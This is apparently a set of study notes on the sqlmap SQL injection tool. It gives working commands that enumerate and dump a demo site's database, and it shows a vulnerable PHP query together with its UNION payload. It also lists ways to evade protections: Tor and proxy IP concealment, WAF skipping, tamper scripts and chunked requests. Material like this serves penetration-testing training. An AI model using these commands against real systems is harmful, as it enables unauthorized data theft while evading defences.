## Supported Databases

SQLMap has the largest support for DBMSes of any other SQL exploitation tool. SQLMap fully supports the following DBMSes:

|`MySQL`|`Oracle`|`PostgreSQL`|`Microsoft SQL Server`|
|`SQLite`|`IBM DB2`|`Microsoft Access`|`Firebird`|
|`Sybase`|`SAP MaxDB`|`Informix`|`MariaDB`|
|`HSQLDB`|`CockroachDB`|`TiDB`|`MemSQL`|
|`H2`|`MonetDB`|`Apache Derby`|`Amazon Redshift`|
|`Vertica`, `Mckoi`|`Presto`|`Altibase`|`MimerSQL`|
|`CrateDB`|`Greenplum`|`Drizzle`|`Apache Ignite`|
|`Cubrid`|`InterSystems Cache`|`IRIS`|`eXtremeDB`|
|`FrontBase`|

## Supported SQL Injection Types

We see the types of SQL injections supported by SQLMap with the `sqlmap -hh` command:

The technique characters `BEUSTQ` refers to the following:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

**Out-of-band SQL Injection** :

This is considered one of the most advanced types of SQLi, used in cases where all other types are either unsupported by the bulnerable web application or are too slow.

#### Log Messages


| `Log Message`                                       | `Examples`                                                                                                                                                                                                   | `Description`                                                                                                                                                                                                                                                                                     |

## Attack Tuning

there are options to fine-tune the SQLi injection attempts to help SQLMap in the detection phase. Every Payload sent to target consist of 

1. vector (e.g., `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
2. boundaries (e.g. `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Vulnerable Code :

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

SQL Code. :

```sql
SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

**Risk & Level** 

This parameters controll aggressiveness of sql injection process.
`--risk` : 

- Risk level of sql injection tests to be performed.
- Range 1 to 3 ( default 1)
- Increasing the risk level increases the likehood of detecting SQL injection but also increase the chance of causing disruption to target.
`--level` :
- This parameter determines the intensity of the SQL injection tests
- Range 1 to 5 (default 1)
- A higher level indicates more extensive and comprehensive testing but also increases the likelihood of causing unintended consequences.


## Advance Attack Tuning

#### Status code.
  
The `--code` parameter in SQLMap is used to specify the HTTP status code that SQLMap should consider as confirmation of a successful injection attempt.(By default status code 200 and 302 consider as successful injection confirmation)

For example, if the web application returns a status code of 500 (Internal Server Error) upon successful injection, you can specify `--code=500` to instruct SQLMap to consider this status code as confirmation of a successful injection attempt.

`sqlmap -u http://example.com/login.php --data "username=test&password=test" --code=500`

#### Titles

If the difference between responses can be seen by inspecting the HTTP page titles. we can use `--titles` parameter.

#### Strings

In case of a specific string value appearing in `TRUE` responses (e.g. `success`), while absent in `FALSE` responses, the option `--string` could be used to fixate the detection based only on the appearance of that single value (e.g. `--string=success`).

#### Text-only

The `--text-only` switch in SQLMap is used to specify that the output generated during the scanning process should be limited to text-only format. This means that any HTML formatting or other non-textual elements will be stripped from the output, making it easier to read and parse.

`sqlmap -u http://example.com/vulnerable_page.php --text-only`

## Enum the database

1. Fetch database name.
`sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch`

2. Enum database and find out tables
`sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables --batch`
-D : Database name.

3. Enum columns from tables.
`sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch`
-T : DBMS table to enum.

4. Get data from the table
`sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch`

5. Dump all
`sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch`

6. DB Schema Enum
`sqlmap -u "http://www.example.com/?id=1" --schema` 
Retrieve the structure of all of the tables.


## Bypassing Web Application Protections

#### Anti-CSRF Token Bypass

Some web applications employs CSRF protection mechanisms , SQLMAP might encounter issues during the scanning process, as it sends requests without the neccessary CSRF token, leading to potential errors or false negatives.

By using the `--csrf-token` parameter, you can provide SQLMap with the CSRF token required to bypass CSRF protection and conduct the scan effectively.

```shell-session
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

#### Unique Value Bypass

By using the `--randomize` option, SQLMap randomizes the order in which it sends the payloads, making it more difficult for security mechanisms to detect and block the attack

`sqlmap -u "http://example.com/vulnerable_page.php" --randomize`

#### --eval

- allows you to specify arbitrary Python code to be evaluated during the testing process.
`--eval` option include:

1. Customizing SQLMap's behavior or parameters dynamically based on certain conditions.
2. Interacting with the SQLMap execution environment to perform additional tasks.
3. Injecting custom payloads or scripts into the testing process.

#### IP Addressing Concealing

In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor.(`--proxy` e.g. `--proxy="socks4://177.39.187.70:33283"`)

If we have a list of proxies, we can provide them to SQLMap with the option `--proxy-file`.

The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a `SOCKS4` proxy service at the local port 9050 or 9150. By using switch `--tor`, SQLMap will automatically try to find the local port and use it appropriately.

`--check-tor` used to check if tor is working properly.

#### WAF Bypass

**`--skip-waf`** :

When you specify `--skip-waf`, SQLMap will not perform checks to detect and identify WAFs that may be protecting the target web application.

`--random-agent`, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.

#### Tamper Scripts

- The `--tamper` option in SQLMap allows you to specify script files containing Python code that modify the SQL injection payloads generated by SQLMap.
- These tamper scripts are applied to each payload before it is sent to the target application. 
- The purpose of using tamper scripts is to evade detection by WAF
- QLMap comes with a set of built-in tamper scripts, but you can also create custom tamper scripts tailored to specific scenarios.
- To get a whole list of implemented tamper scripts, along with the description as above, switch `--list-tampers` can be used.

|**Tamper-Script**|**Description**|
|---|---|
|`0eunion`|Replaces instances of UNION with e0UNION|
|`base64encode`|Base64-encodes all characters in a given payload|
|`between`|Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`|
|`commalesslimit`|Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart|
|`equaltolike`|Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart|
|`halfversionedmorekeywords`|Adds (MySQL) versioned comment before each keyword|
|`modsecurityversioned`|Embraces complete query with (MySQL) versioned comment|
|`modsecurityzeroversioned`|Embraces complete query with (MySQL) zero-versioned comment|
|`percentage`|Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)|
|`plus2concat`|Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart|
|`randomcase`|Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)|
|`space2comment`|Replaces space character ( ) with comments `/|
|`space2dash`|Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)|
|`space2hash`|Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`)|
|`space2mssqlblank`|Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters|
|`space2plus`|Replaces space character ( ) with plus (`+`)|
|`space2randomblank`|Replaces space character ( ) with a random blank character from a valid set of alternate characters|
|`symboliclogical`|Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)|
|`versionedkeywords`|Encloses each non-function keyword with (MySQL) versioned comment|
|`versionedmorekeywords`|Encloses each keyword with (MySQL) versioned comment|

#### MISC BYPASSES

`--chunked` : splits the post request's body into so-called "chunks". Blacklisted sql keywords are split into chunks in a way that request containing them can pass unnoticed.
